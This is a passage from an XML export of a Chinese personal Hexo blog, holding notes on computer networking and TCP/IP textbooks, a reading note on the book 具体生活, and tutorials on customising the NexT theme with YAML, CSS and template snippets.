    <content><![CDATA[<p>《计算机网络：自定向下方法》笔记</p>
<span id="more"></span>

<h1 id="第1章-计算机网络和因特网"><a href="#第1章-计算机网络和因特网" class="headerlink" title="第1章 计算机网络和因特网"></a>第1章 计算机网络和因特网</h1><h2 id="1-1-什么是因特网"><a href="#1-1-什么是因特网" class="headerlink" title="1.1 什么是因特网"></a>1.1 什么是因特网</h2><blockquote>
<p>回答这个问题有两种方式：1. 描述因特网的具体构成，即构成因特网的基本硬件和软件组件；2. 根据为分布式应用提供服务的联网基础设施来描述因特网。</p>
</blockquote>
<h3 id="1-1-1-具体构成描述"><a href="#1-1-1-具体构成描述" class="headerlink" title="1.1.1 具体构成描述"></a>1.1.1 具体构成描述</h3><blockquote>
<p>因特网是一个世界范围的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络（智能手机、平板电脑、汽车等等）。用因特网术语来说，这些设备都称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>。</p>
<p>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接在一起。不同的链路能够以不同的传输速率（transmission rate）传输数据。</p>
<p>当一个端系统向另一个端系统发送数据时，发送端讲数据分段，并为每段加上首部字节。由此形成的信息包用计算机网络的术语来说称为<strong>分组（packet）</strong>。</p>
<p>分组交换机从入通信链路接收到达的分组，并将它从出链路转发出去。最著名的两种分组交换机类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong>。链路层交换机通常用于接入网中，而路由器通常用于网络核心中。</p>
<p>端系统通过因特网服务提供商（Internet Service Provider, ISP）接入因特网。</p>
</blockquote>
<h3 id="1-1-2-服务描述"><a href="#1-1-2-服务描述" class="headerlink" title="1.1.2 服务描述"></a>1.1.2 服务描述</h3><blockquote>
<p>与因特网相连的端系统提供了一个套接字接口（socket interface），该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式。（五元组：source_ip, source_port, destination_ip, destination_port, protocol_type ）<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_intercept.png"></p>
</blockquote>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
        <category>计算机网路_自顶向下方法</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记——《具体生活》</title>
    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/</url>
    <content><![CDATA[<p>  焦虑是现代人的常态。时间不够用，钱不够花，职业发展不够快，对当下和未来不够了解…我们不断加快生活的节奏，但快节奏之后是否带来了好处，我们并不清楚，只是觉得“快”比“慢”要好。</p>
<p>  很多时候，我们做不好事情，是我们太匆忙、太着急，其实只要慢三拍，我们的事情会比以前做得好很多。有时候，慢比快好。</p>
<p>  当忙碌成为生活的主旋律时，我们是否可以思考一下：生活的目的是什么？从容做事，优雅生活，这是我们生活的目的。很多人羡慕所谓的贵族生活，其实过去贵族的物质生活并不比今天的中产阶级好多少，但是他们整体的生活质量远非今天一般意义上的富有家庭所能比的。究其原因，是因为今天的人缺少了那份应有的从容和优雅。</p>
<p>  当我们做事情的时候能够慢一点，少走点弯路，多花点实践享受浪漫而美好的人生，畅游人类知识和艺术的海洋，我们会发现自己是在真正地生活，而不是只是为了工作而活着。</p>
<span id="more"></span>

<h2 id="1-旅行的意义"><a href="#1-旅行的意义" class="headerlink" title="1. 旅行的意义"></a>1. 旅行的意义</h2><h2 id="2-博物馆之美"><a href="#2-博物馆之美" class="headerlink" title="2. 博物馆之美"></a>2. 博物馆之美</h2><h2 id="3-读书以以怡情长智"><a href="#3-读书以以怡情长智" class="headerlink" title="3. 读书以以怡情长智"></a>3. 读书以以怡情长智</h2><p>  古人把读万卷书和行万里路看作精英阶层成长不可或缺的两个环节，它们既能使人获得知识，也能令人愉悦自我。</p>
<h3 id="3-1-阅读的意义"><a href="#3-1-阅读的意义" class="headerlink" title="3.1 阅读的意义"></a>3.1 阅读的意义</h3><ol>
<li>阅读是放下可以让我们审视人生的不多的方式之一。<br>苏格拉底曾经说过，未经审视的人生不值得度过。而绅士人生需要有闲暇。读书必须有比较长的一段时间，不做其他事情，专心致志地阅读。</li>
<li>阅读是一种交友方式，借书可以令两人的关系有所增进。<br>借书，说明至少两个人有共同的语言，在此基础上，谈合作也好，谈利益也罢，才搭得上话。对于男女之间交往来说，借一次书，还一次，至少就接触了两次，并且这也能创造一个良好的交谈话题。</li>
<li>阅读不仅仅是为了让我们在冷酷无情的科技时代获得喘息，让我们重启大脑深入思考的功能，也是抵抗狭隘、思想控制和舆论支配的方式。<blockquote>
<p>常常在焦虑的时候，或者感到特别难的时候，会去看看曾经觉得深有启发的书，让自己慢慢静下来，焦虑慢慢会平息，困难也会渐渐淡化，恢复状态，继续前行。现在发现，将书中的内容，与自己思想相结合，写出来的时候，特别的舒畅。</p>
</blockquote>
</li>
</ol>
<h2 id="4-音乐的故事"><a href="#4-音乐的故事" class="headerlink" title="4. 音乐的故事"></a>4. 音乐的故事</h2><h2 id="5-徕卡摄影的魅力"><a href="#5-徕卡摄影的魅力" class="headerlink" title="5. 徕卡摄影的魅力"></a>5. 徕卡摄影的魅力</h2><h2 id="6-香醇美酒"><a href="#6-香醇美酒" class="headerlink" title="6. 香醇美酒"></a>6. 香醇美酒</h2><h2 id="7-奢侈品的光泽"><a href="#7-奢侈品的光泽" class="headerlink" title="7. 奢侈品的光泽"></a>7. 奢侈品的光泽</h2>]]></content>
      <categories>
        <category>怡情长智</category>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书/生活</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 博客 NexT 主题下如何添加分类、标签</title>
    <url>/hexo-blog/Hexo-NexT%20%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E3%80%81%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<p>Hexo Next 主题默认带有不少菜单，如关于（about）、分类（categories）、标签（tags）等，默认处于注释状态，将需要取消的菜单注释掉，然后生成相应的 page 即可。</p>
<span id="more"></span>

<ol>
<li><p>打开 <code>~\themes\next\_config.yml</code> 文件，找到 <code>menu</code> 相关的设置，取消掉需要的菜单项的注释。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/hexo_next_menu.png" alt="test"></p>
</li>
<li><p>重新生成部署后，可以看到新增的菜单项，但是单击后会报如下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cannot GET &#x2F;about&#x2F;</span><br><span class="line">Cannot GET &#x2F;tags&#x2F;</span><br><span class="line">Cannot GET &#x2F;categories&#x2F;</span><br></pre></td></tr></table></figure></li>
<li><p>这是因为还需要运行如下命令新建相关 page</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br><span class="line">hexo new page &quot;tags&quot;</span><br><span class="line">hexo new page &quot;categories&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>新建 page 后，会在 source 目录下新建 <code>about</code>、<code>tags</code>、<code>categories</code>文件夹，每个文件夹下还会创建一个<code>index.md</code>文件表示关于、标签页分类页面，编辑这三个MarkDown文件可以自定义这三个页面的内容.</p>
</li>
<li><p>最后一步，编辑各页面对应的<code>index.md</code>文件，增加 type 即可。注意冒号 : 后必须空一格，title 和 date 是默认生成的。重新部署后能够看到效果。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-03-13 15:21:30</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-03-13 15:21:30</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-03-13 15:21:30</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li><p>在新建博文的头部，直接输入该博文的分类、标签等即可。分类只能有一个，标签能有多个，多个标签不能一行，注意下面的格式。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span> <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/3/26</span> <span class="string">hh:mm:ss</span> <span class="comment"># 时间</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># 分类</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">分类</span>  <span class="comment"># 只能由一个</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># 标签</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">PS3</span>  <span class="comment"># 能有多个</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">Games</span>  <span class="comment"># 一个标签一行</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="string">摘要</span></span><br><span class="line"><span class="string">&lt;!--more--&gt;</span></span><br><span class="line"><span class="string">正文</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>参考<ul>
<li><a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93644533">Hexo博客NexT主题下添加分类、标签、关于菜单项</a></li>
<li><a href="https://hexo.io/zh-cn/docs/front-matter">Hexo 官方文档</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>搭建环境</tag>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-NexT 分类多层级描述</title>
    <url>/hexo-blog/Hexo-NexT%20%E5%88%86%E7%B1%BB%E5%A4%9A%E5%B1%82%E7%BA%A7%E6%8F%8F%E8%BF%B0/</url>
    <content><![CDATA[<ol>
<li>分类一般用法<br> Hexo 中分类和标签有着明显的差别：分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。 <span id="more"></span>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Diary</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PS3</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Games</span></span><br></pre></td></tr></table></figure></li>
<li>父子分类<br>如果您有过使用 WordPress 的经验，就很容易误解 Hexo 的分类方式。WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Diary</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Life</span></span><br></pre></td></tr></table></figure>
会使分类Life成为Diary的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</li>
<li>并列+子分类<br>如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> [<span class="string">Diary</span>, <span class="string">PlayStation</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">Diary</span>, <span class="string">Games</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">Life</span>]</span><br></pre></td></tr></table></figure>
此时这篇文章同时包括三个分类： PlayStation 和 Games 分别都是父分类 Diary 的子分类，同时 Life 是一个没有子分类的分类。 </li>
<li>分类页面优化<br>我想要的是这种层次分明的效果：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/categories-result.png" alt="result"><br>但我设置完成后，实际的效果, 层次感不强。:<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/categories_ori.png" alt="ori"><strong>问题解决</strong><br>首先尝试了CodeHeap 的文章<a href="https://jrbcode.gitee.io/posts/be9758cd.html">Hexo+NexT博客归档/标签/分类页美化</a>,对分类栏进行了优化。发现只是增加了效果，分类的层次结构还是不清晰。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/categories_1.png" alt="categories">然后修改 /themes/next/source/css/_common/components/pages/categories.styl 代码,将  .category-list-child 的 padding-left 属性改为 60px。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.category-list-child &#123;</span><br><span class="line">  padding-left: 60px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
最终效果图：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/categories_2.png" alt="categories"></li>
</ol>
<p>——————————<br><strong>参考</strong></p>
<ul>
<li><a href="https://hexo.io/zh-cn/docs/front-matter">Hexo 官方文档</a></li>
<li><a href="https://jrbcode.gitee.io/posts/be9758cd.html">Hexo+NexT博客归档/标签/分类页美化</a></li>
<li><a href="http://yuchen-lea.github.io/2016-01-23-display-hexo-category-in-hierarchy/">Hexo多级类别的层级显示</a></li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-NexT 设置博客背景图片</title>
    <url>/hexo-blog/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h2 id="1-设置背景图片"><a href="#1-设置背景图片" class="headerlink" title="1. 设置背景图片"></a>1. 设置背景图片</h2><p>将想要的背景图片放入 themes/next/source/images。打开 themes/next/source/css/ _custom/custom.styl 文件，这个是 Next 故意留给用户自己个性化定制一些样式的文件，添加以下代码即可。</p>
<span id="more"></span>
<p>实际上我的版本里没有_custom，通过新建目录无法实现。我是在 themes/next/source/css/_schemes/Gemini/index.styl 中添加的代码，Gemini是我的 next 的布局样式。</p>
<p>在写这篇博客的过程中，又尝试了下将代码添加到 blog_root/source/_data/styles.style 下，设置成功。如果没有这个目录，直接新建即可。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">/images/yourbackground.jpg</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-attachment</span>:fixed; //不重复</span><br><span class="line">    <span class="attribute">background-size</span>: cover;      //填充</span><br><span class="line">    <span class="attribute">background-position</span>:<span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>background:url 为图片路径，也可以直接使用链接。</li>
<li>background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li>
<li>background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定</li>
<li>background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。</li>
</ul>
<h2 id="2-博客内容透明化"><a href="#2-博客内容透明化" class="headerlink" title="2. 博客内容透明化"></a>2. 博客内容透明化</h2><p>NexT 主题的博客文章均是不透明的，这样读者就不能好好欣赏背景图片了，下面的方法可以使博客内容透明化：</p>
<p>在 blog_root/source/_data/styles.style  中添加以下内容：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//博客内容透明化</span><br><span class="line">//文章内容的透明度设置</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//搜索框（local-search）的透明度设置</span><br><span class="line"><span class="selector-class">.popup</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：其中 header-inner 不能使用 opacity 进行配置。因为 header-inner 包含 header.swig 中的所有内容。若使用 opacity 进行配置，子结点会出很多问题。</p>
<h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><ul>
<li><a href="https://tding.top/archives/761b6f4d.html">Hexo-NexT 设置博客背景图片</a></li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-NexT 设置近期文章</title>
    <url>/hexo-blog/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E8%BF%91%E6%9C%9F%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<ol>
<li><p>新建 source/_data/sidebar.njk 文件，内容如下：</p>
<span id="more"></span>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;# RecentPosts #&#125;</span><br><span class="line">&#123;%- if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class&#x3D;&quot;links-of-recent-posts motion-element&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;links-of-recent-posts-title&quot;&gt;</span><br><span class="line">      &#123;%- if theme.recent_posts.icon %&#125;</span><br><span class="line">      &lt;i class&#x3D;&quot;&#123;&#123; theme.recent_posts.icon &#125;&#125; fa-fw&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &#123;%- endif %&#125;</span><br><span class="line">      &#123;&#123; theme.recent_posts.title &#125;&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;links-of-recent-posts-list&quot;&gt;</span><br><span class="line">      &#123;%- set posts &#x3D; site.posts.sort(&#39;date&#39;, &#39;desc&#39;).toArray() %&#125;</span><br><span class="line">      &#123;%- for post in posts.slice(&#39;0&#39;, theme.recent_posts.max_count) %&#125;</span><br><span class="line">        &lt;li class&#x3D;&quot;links-of-recent-posts-item&quot;&gt;</span><br><span class="line">          &#123;&#123; next_url(post.path, post.title, &#123;title: post.path&#125;) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;li&gt;</span><br><span class="line">      &#123;%- endfor %&#125;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>修改_config.next.yml，取消 custom_file_path 中的 sidebar 和 style 两个注释，并新增 recent_posts 内容。variable 应该是设置另外的功能时打开的，和此处无关。实际上我的 sidebar 原本是 source/_data/sidebar.swig, 直接改成 njk 的没问题。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="string">source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"><span class="attr">recent_posts:</span></span><br><span class="line"><span class="comment"># 块标题</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">最近文章</span></span><br><span class="line"><span class="comment"># 图标</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-history</span></span><br><span class="line"><span class="comment"># 最多多少文章链接</span></span><br><span class="line">  <span class="attr">max_count:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改 source/_data/styles.styl 文件，文件不存在新建即可。添加如下代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 近期文章</span><br><span class="line"><span class="selector-class">.links-of-recent-posts</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span></span><br><span class="line">  margin-top: <span class="number">10px</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-title</span><br><span class="line">  font-size: <span class="number">1.03em</span></span><br><span class="line">  font-weight: <span class="number">600</span></span><br><span class="line">  margin-top: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-list</span><br><span class="line">  list-style: none</span><br><span class="line">  margin: <span class="number">0</span></span><br><span class="line">  padding: <span class="number">0</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>——————————<br><strong>参考</strong></p>
<ul>
<li><a href="https://weilining.github.io/925-1.html">Hexo NexT 添加近期文章功能</a></li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>【TCP/IP详解】 第1章 概述</title>
    <url>/TCPIP%E8%AF%A6%E8%A7%A3%E5%8D%B71_%E5%8D%8F%E8%AE%AE_%E7%AC%AC%E4%B8%80%E7%AB%A0/TCPIP%E8%AF%A6%E8%A7%A3%E5%8D%B71_%E5%8D%8F%E8%AE%AE_%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    <content><![CDATA[<p>《TCP/IP详解 卷1：协议》第1章笔记</p>
<span id="more"></span>

<h2 id="1-1-分层"><a href="#1-1-分层" class="headerlink" title="1.1 分层"></a>1.1 分层</h2><p><strong>TCP/IP 协议族的四个层次</strong><br><img src="TCP-IP%E5%8D%8F%E8%AE%AE%E6%97%8F%E7%9A%84%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1.png" alt="TCP/IP协议族的四个层次"></p>
<ul>
<li>链路层，也称作数据链路层或网络接口层，通常包括操作系统中的设备驱动程序和计算机中对应的网络接口卡，一起处理与电缆（或其他任何传输媒介）的物理接口细节。</li>
<li>网络层，也称互联网层，提供<strong>点到点</strong>的服务，处理分组在网络中的活动。（<strong>不可靠</strong>的服务。）</li>
<li>运输层，主要为两台主机提供<strong>端到端</strong>的通信。TCP 在 不可靠的 IP层上提供了<strong>可靠</strong>的运输层。</li>
<li>应用层，负责处理特定的应用程序细节。</li>
</ul>
<br>

<p><strong>路由器</strong></p>
<ul>
<li>构造互联网的共同基石是路由器。</li>
<li>构造互连网最简单的方法是把两个或多个网络通过路由器连接。路由器具有多个网络接口，通常连接不同网络的接口有不同的 MAC 地址。</li>
<li>路由器是在网络层上对网络进行互连，网桥是在链路层上对网络进行互连。</li>
</ul>
<p><img src="%E9%80%9A%E8%BF%87%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E7%9A%84%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%BB%9C.png" alt="通过路由器连接的两个网络"></p>
<h2 id="1-2-TCP-IP的分层"><a href="#1-2-TCP-IP的分层" class="headerlink" title="1.2 TCP/IP的分层"></a>1.2 TCP/IP的分层</h2><p><img src="TCP-IP%E5%8D%8F%E8%AE%AE%E6%97%8F%E4%B8%AD%E4%B8%8D%E5%90%8C%E5%B1%82%E6%AC%A1%E7%9A%84%E5%8D%8F%E8%AE%AE.png" alt="TCP/IP协议族中不同层次的协议"></p>
<ul>
<li>TCP 和 UDP 都是用 IP 作为网络层协议</li>
<li>TCP 虽然使用不可靠的 IP 服务，但它提供一种可靠的运输层服务。</li>
<li>UDP 提供不可靠服务。SNMP 使用UDP 协议。</li>
<li>TCP 和 UDP 的每组数据都通过端系统和每个中间路由器中的 IP 层在互连网中进行传播。</li>
<li>ICMP 是 IP 协议的附属协议，用它来与其他主机或路由器交换错误报文和其他重要信息，Ping 和 Traceroute 都使用 ICMP。</li>
<li>IGMP 是 Internet 组管理协议，用来把一个 UDP 数据包多播到多个主机。</li>
<li>ARP 和 RARP 是某些网络接口使用的特殊协议，用来转换 IP 层和网络接口层使用的地址。</li>
</ul>
<h2 id="1-3-互连网的地址"><a href="#1-3-互连网的地址" class="headerlink" title="1.3 互连网的地址"></a>1.3 互连网的地址</h2><p>互联网上的每个接口必须有一个唯一的 Internet 地址。IPv4 长32位，IPv6 长128位。本书中提到的 IP 地址都是 IPv4。<br><img src="%E4%BA%94%E7%B1%BB%E4%BA%92%E8%81%94%E7%BD%91%E5%9C%B0%E5%9D%80.png" alt="五类互联网地址"><br><img src="%E5%90%84%E7%B1%BBIP%E5%9C%B0%E5%9D%80%E7%9A%84%E8%8C%83%E5%9B%B4.png" alt="各类IP地址的范围"></p>
<h2 id="1-4-域名系统（DNS）"><a href="#1-4-域名系统（DNS）" class="headerlink" title="1.4 域名系统（DNS）"></a>1.4 域名系统（DNS）</h2><p>域名系统是一个分布式数据库，，它提供 IP 地址与主机名之间的映射信息。</p>
<h2 id="1-5-封装"><a href="#1-5-封装" class="headerlink" title="1.5 封装"></a>1.5 封装</h2><p><img src="%E6%95%B0%E6%8D%AE%E8%BF%9B%E5%85%A5%E5%8D%8F%E8%AE%AE%E6%A0%88%E6%97%B6%E7%9A%84%E5%B0%81%E8%A3%85%E8%BF%87%E7%A8%8B.png" alt="数据进入协议栈时的封装过程"></p>
<ul>
<li>运输层<ul>
<li>TCP 报文段：TCP 是有连接的，每个需传输的 TCP 数据单元都是应用程序总传输数据的一部分（段），它们存在着先后顺序，而不是单独的。</li>
<li>UDP 数据报：UDP 是无连接的，每个数据报是独立的，不属于某个整体，和 IP 数据报一样。首部 8 字节。</li>
</ul>
</li>
<li>网络层：IP 数据报</li>
<li>链路层：帧(Frame)，以太网传输。 </li>
</ul>
<h2 id="1-6-分用"><a href="#1-6-分用" class="headerlink" title="1.6 分用"></a>1.6 分用</h2><p>当目的主机收到一个以太网数据帧时，数据就开始从协议栈中由底向上升，同时去掉各层协议加上的报文首部。每层协议盒都要去检查报文首部中的协议标识，以确定接收数据的上层协议，这个过程称作分用。<br><img src="%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%95%B0%E6%8D%AE%E5%B8%A7%E7%9A%84%E5%88%86%E7%94%A8%E8%BF%87%E7%A8%8B.png" alt="以太网数据帧的分用过程"></p>
<ul>
<li>ICMP 和 IGMP 报文都被封装在 IP 数据报中。</li>
</ul>
<h2 id="1-7-端口号"><a href="#1-7-端口号" class="headerlink" title="1.7 端口号"></a>1.7 端口号</h2><ul>
<li>端口号用来标识互相通信的应用程序。</li>
<li>服务器使用知名端口号。</li>
<li>客户端通常对它所使用的端口号并不关心，只要保证该端口号在本机上唯一，使用临时端口号。</li>
</ul>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
        <category>TCP/IP详解 卷1</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-NexT 设置圆角</title>
    <url>/hexo-blog/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92/</url>
    <content><![CDATA[<ol>
<li><p>在 blog_root/source/_data/variables.styl 中增加下列代码：</p>
<span id="more"></span>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$border-radius-inner     = 20px;</span><br><span class="line">$border-radius           = 20px;</span><br></pre></td></tr></table></figure></li>
<li><p>然后在 NexT 的配置文件 _config.yml 中取消 variables.styl 的注释：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure></li>
<li><p>问题描述<br>侧边栏的圆角明显有一层阴影，圆角效果不明显<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/circle_problem.png" alt="problem"></p>
</li>
<li><p>问题解决<br>github issues 上也有人提过类似的问题<a href="https://github.com/next-theme/hexo-theme-next/issues/51">侧边栏顶栏无法显示为圆角</a>，并且给出了回答。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/issues_answer.png" alt="issues"><br>回答中有提到黑色背景覆盖了圆角，所以我尝试了下将黑色改为透明，成功实现。具体是修改 /themes/next/source/css/_variables/Gemini.styl 内代码,将 $body-bg-color 赋值为透明 transparent。</p>
